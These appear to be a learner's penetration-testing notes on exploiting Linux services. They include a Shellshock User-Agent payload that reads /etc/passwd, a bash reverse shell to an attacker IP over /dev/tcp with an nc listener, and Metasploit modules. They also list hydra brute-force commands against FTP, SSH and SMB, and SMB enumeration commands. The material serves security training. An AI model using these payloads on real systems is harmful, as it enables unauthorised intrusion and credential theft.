## Overview of Linux
- An open-source OS comprised of a linux kernel (developed by Linus torvalds) and a GNU toolkit (a collection of software and utilities developed by Richard Stallman)
- commonly referred to as GNU/Linux
- various distributions exist for various uses (distros have the same OS but diff desktop envs)
- Most used for servers

Egs:
Ubuntu -> general use
Kali -> security research (debian based)
Debian -> random stuff servers etc

Common Services:
- Apache Web server -p80/443  --> webserver like MIS,Nginx etc.  (443 if ssl configured)
- SSH -p22  --> succeser to telnet
- FTP -p21 --> usually exists with a webserver to transfer files
- SAMBA -p445  --> SMBs implemented for linux (for shares etc)

# Exploiting linux vulns

## Shellshock CVE-2014-6271
- Bash vuln most prevalent in past years
- involves apache and bash
- Family of vulns that affect bash aft ver 1.3 to allow RCE to obtain a bashshell

- Attacker runs a CGI script or .sh script on the target apache server to show output on the web interface

About bash:
- bash is a nix shell part of GNU and default for most linux distros

demo:
Run nmap to see if cgi used by server is vuln to shellshock
```bash
nmap -sV <ip> --script=http-shellshock --script-args="http-shellshock.url=/gettime.cgi"
```

Replace user agent header of get request used by the cgi with this (spacing impt):

User-agent:  () {  :;  }; echo; echo; /bin/bash -c 'cat /etc/passwd'

- Res given by server will be the executed code (gives a list of all user acts from above code)

Reverse shell:
- On attackers system:
	nc -lvnp 1234

- In burpsuite edit the CGI get request 
User-agent:  () { :; }; echo; echo; /bin/bash -c 'bash -i>&/dev/tcp/(attackersIP)/1234 0>&1'

- -i>& redirects input from attacker to server
- 0>&1 redirects output to the listener on attacker machine

Check the linux distro used:
```bash
cat etc/*issue*

#kernal information
uname -a
```

MSF method for shellshock:
```msfconsole
#auxiliary module
use auxiliary/scanner/http/apache_mod_cgi_bash_env

#exploit
use exploit/multi/http/apache_mod_cgi_bash_env_exec

set targeturi /gettime.cgi

```

### FTP exploit
- Default TCP -p21
- Use to transfer files etc very common
- Sometime anonymous access is allowed (rare)
- Exploit a inherent vuln in FTP version or BF the credentials (Common)

Demo:
Exploits ProFTPD 1.3.5a
- Check if anonymous access enabled
	- Manually by keying `ftp 192.92.66.3` then keying anonymous and enter no password
	- nmap script (use below to find available scripts)
	`ls -al /usr/share/nmap/scripts/ | grep ftp-*`
	
-  bruteforce (set threads to 4 so service overload and go down)
	`hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.93.66.3 -t 4 ftp`

- searchsploit proFTPD

### SSH exploit
- Default TCP -p22
- remote admin protocol (used everywhere all the time)
- Auth methods
	- Username/password
	- Key based auth (use of keypair) -->unlikely unless private key is found
		- public key-> on the server 
		- private key -> with person connecting to the server, only 1 guy 

Demo:
OpenSSH has no inherent vulns
- bruteforce
	`hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/common_passwords.txt 192.93.66.3 -t 4 ssh`
	or use msfconsole ssh_login
- ssh username@`ipadr`
	enter the password etc

### Samba exploit
- smb (server message block) a network file sharing protocol share files/peripherals in a local network (LAN)
- Default TCP -p445, originally -p139 ran on top of NetBIOS (Common to have both at the same time for compatibility)

Demo:
Smb bruteforce
`hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.93.66.3 -t 4 smb`

Smb enumeration
`smbmap -H 192.56.47.3 -u admin -p password1`

Access SMB
List out all shares
`smbclient -L 192.56.47.3 -U admin`

Choose specific share
`smbclient //192.56.47.3/shawn -U admin`
`smbclient //192.56.47.3/admin -U admin`

Enter password and use like ftp
`get flag`
`get flag.tar.gzip`
`tar xzf flag.tar.gzip `

Enumerate as much info from machine (checks for nullshare if cred blank)
`enum4linux -a 192.56.47.3
`enum4linux -a -u admin -p password1 192.56.47.3`


# Linux Priv escalation
